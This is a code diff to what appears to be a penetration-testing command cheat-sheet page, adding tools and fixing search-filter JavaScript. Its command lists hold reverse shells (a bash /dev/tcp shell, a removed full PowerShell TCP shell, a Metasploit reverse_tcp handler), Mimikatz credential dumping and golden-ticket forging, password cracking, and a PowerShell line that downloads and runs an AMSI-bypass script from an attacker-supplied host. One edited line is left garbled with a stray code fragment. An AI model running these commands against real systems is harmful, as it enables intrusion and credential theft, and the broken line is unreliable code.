@@ -266,8 +266,7 @@
           "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {{IP}}; set LPORT {{PORT}}; exploit'",
           "nc -lvnp {{PORT}}",
           "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
-          "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1",
-          "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{IP}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+          "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1",m.Flush()};$client.Close()\"",
           "hydra -l {{USER}} -P wordlist.txt {{IP}} ssh",
           "john --wordlist=rockyou.txt hash.txt",
           "hashcat -m 0 -a 0 hash.txt rockyou.txt",
@@ -359,6 +358,7 @@
           "Get-ServicePermission"
         ],
         "Tools": [
+          // Kali Linux Tools
           "msfconsole",
           "burpsuite",
           "wireshark",
@@ -374,6 +374,13 @@
           "theharvester -d {{DOMAIN}} -l 500 -b google",
           "responder -I eth0 -rdw",
           "empire",
+          "nuclei -u {{URL}}",
+          "owasp-zap",
+          "lynis audit system",
+          "gobuster dir -u {{URL}} -w /usr/share/wordlists/common.txt",
+          "arachni {{URL}}",
+          "skipfish -o output {{URL}}",
+          // Windows Red Team Tools
           "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
           "rubeus.exe klist",
           "SharpHound.exe -c All",
@@ -388,7 +395,20 @@
           "BloodHound.exe",
           "netsh wlan show profiles",
           "tasklist /svc",
-          "sc query"
+          "sc query",
+          "cobaltstrike",
+          "empire --rest",
+          "atomic-red-team --test T1059.001",
+          "winpeas.exe",
+          "sharphound.exe --collectionmethods All",
+          "rubeus.exe triage",
+          "mimikatz.exe 'kerberos::golden /user:{{USER}} /domain:{{DOMAIN}} /sid:SID /rc4:HASH /ptt'",
+          "certify.exe find /vulnerable",
+          "powershell-empire server",
+          "covenant",
+          "inveigh",
+          "ghostpack Seatbelt.exe",
+          "powershell -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://{{IP}}:{{PORT}}/amsi-bypass.ps1\")'"
         ]
       };
 
@@ -564,7 +584,7 @@
       }
 
       function updateCategoryCounts() {
-        const search = document.getElementById("search').value.toLowerCase();
+        const search = document.getElementById("search").value.toLowerCase();
 
         const categoryCountMap = {
           "Active Directory": "count-ad",
@@ -592,7 +612,7 @@
 
         let totalCount = 0;
         for (const category in commands) {
-          const filtered = commands[category] .filter(
+          const filtered = commands[category].filter(
             (cmd) =>
               cmd.toLowerCase().includes(search) ||
               category.toLowerCase().includes(search)
